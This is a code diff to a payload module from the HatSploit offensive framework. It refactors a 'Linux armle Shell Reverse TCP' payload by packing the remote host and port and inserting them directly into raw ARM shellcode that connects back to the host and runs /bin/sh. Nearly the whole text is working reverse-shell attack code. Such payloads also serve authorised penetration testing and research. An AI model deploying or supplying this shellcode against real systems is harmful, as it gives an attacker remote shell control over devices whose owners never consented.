@@ -6,11 +6,11 @@
 #
 
 from hatsploit.lib.payload import Payload
+from pex.socket import Socket
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, Socket):
     details = {
-        'Category': "stager",
         'Name': "Linux armle Shell Reverse TCP",
         'Payload': "linux/armle/shell_reverse_tcp",
         'Authors': [
@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
+        remote_host = self.pack_host(self.handler['RHOST'])
+        remote_port = self.pack_port(self.handler['RPORT'])
 
         return (
             b"\x01\x10\x8F\xE2"
@@ -42,12 +42,7 @@ class HatSploitPayload(Payload):
             b"\x92\x1a\x05\xb4"
             b"\x69\x46\x0b\x27"
             b"\x01\xDF\xC0\x46"
-            b"\x02\x00"
-            b":rport:port:"
-            b":rhost:ip:"
+            b"\x02\x00" + remote_port + remote_host +
             b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x00"
-        ), {
-            'rhost': remote_host,
-            'rport': remote_port
-        }
+        )
